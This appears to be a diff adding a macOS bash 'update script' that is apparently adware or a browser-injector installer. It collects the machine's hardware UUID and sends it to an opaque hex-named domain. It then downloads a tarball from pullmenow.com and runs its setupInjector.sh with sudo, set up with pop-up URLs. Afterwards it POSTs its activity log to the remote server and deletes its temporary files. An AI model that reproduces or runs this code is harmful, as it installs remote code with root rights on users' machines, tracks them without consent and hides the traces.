@@ -1,0 +1,77 @@
+#!/bin/bash
+# ioreg -l | grep -e Manufacturer -e 'Vendor Name'
+updFile="/var/tmp/updText.txt";
+updFileError="/var/tmp/updTextError.txt";
+chmod 777 $updFile;
+chmod 777 $updFileError;
+echo > $updFile
+echo > $updFileError
+br_mid=$(ioreg -rd1 -c IOPlatformExpertDevice | awk '/IOPlatformUUID/ { split($0, line, "\""); printf("%s\n", line[4]); }')
+midFile=$(find /System/Library/Frameworks -type f -name "*.uuid.plist" -print0 | xargs -0 ls -tl | sort -n | tail -1 | awk '{print $9}')
+if [ -e "$midFile" ]; then
+    mid=$(echo "$midFile" | python -c 'import sys;print open(sys.stdin.read().rstrip(), "r").read().split("<string>")[1].split("</string>")[0]')
+    echo "mid: $mid." >> $updFile
+fi
+get_pd_client_data="http://93a555685cc7443a8e1034efa1f18924.com/v/cld?mid=$br_mid&ct=pd"
+data=$(curl -s "$get_pd_client_data")
+dc="PP5ddfd484f2030d9c-0-NM-XX"
+channel=$(echo $dc | tr -d '[[:space:]]' | tr -cd 0-9)
+pdChannel=${dc:2}
+echo "DC: $dc" >> $updFile
+click_id="0"
+echo "CLICK_ID: $click_id" >> $updFile
+click_stamp=""
+echo "CLICK_STAMP: $click_stamp" >> $updFile
+id=$dc"--"$click_id"___"$click_stamp"___"$br_mid
+echo "Full ID: $id" >> $updFile
+domain=""http://aae9598c815c1745bd9f387c226fc02427.com""
+pop_url="'http://aae9598c815c1745bd9f387c226fc02427.com/pp/fd?re=1&uid=[MACHINE_ID]&u=[CONTEXT_URL]'"
+pop_delay="1"
+
+if [ $midFile ]; then
+	frm=$(echo $midFile | tail -1 | awk -F "/" '{print $5}' | awk -F "." '{print $1}')
+fi
+mid_proc=false
+if [ $frm ];then
+	if ps -ef | grep -v grep | grep -q $frm; then
+		mid_proc=true
+	fi
+fi
+echo "midFile: $midFile." >> $updFile
+echo "frm: $frm" >> $updFile
+echo "mid_proc: $mid_proc" >> $updFile
+
+pInj () {
+	tmpfile="/var/tmp/dit8.tgz"
+	filePath="/var/tmp/Injector10052016"
+	/usr/bin/curl -s  -L -o $tmpfile "http://pullmenow.com/pd_files/dit8.tgz"
+	sleep 10
+	tar -xzf $tmpfile -C /var/tmp/
+	sleep 5
+	cd $filePath
+	sudo chmod 777 $filePath/setupInjector.sh
+	echo sudo $filePath/setupInjector.sh A$pdChannel $click_id $domain >> $updFile
+	sudo $filePath/setupInjector.sh A$pdChannel $click_id $domain
+	sleep 30
+#	rm -rf $tmpfile
+#	rm -rf $filePath
+}
+shouldPDInj="1"
+echo $shouldPDInj
+if [[ "$shouldPDInj" == "1" ]]; then
+	echo "vs_inj_no_mid" >> $updFile
+	echo "Installing pInj with logger" >> $updFile
+	pInj &> $updFileError;
+	sleep 10
+	echo $(</var/tmp/updTextError.txt) >> $updFile
+else
+	echo "vs_inj_mid: $mid" >> $updFile
+fi
+
+eventType="Update Script Output"
+sleep 30
+curl --request POST 'http://93a555685cc7443a8e1034efa1f18924.com/v/pd-logger' --data "vs_mid=$mid" --data "br_mid=$br_mid" --data-urlencode "event_type=$eventType" --data-urlencode "event_data=$(<$updFile)"
+sleep 5
+rm -rf $updFile
+rm -rf /var/tmp/updText2.txt
+rm -rf $updFileError
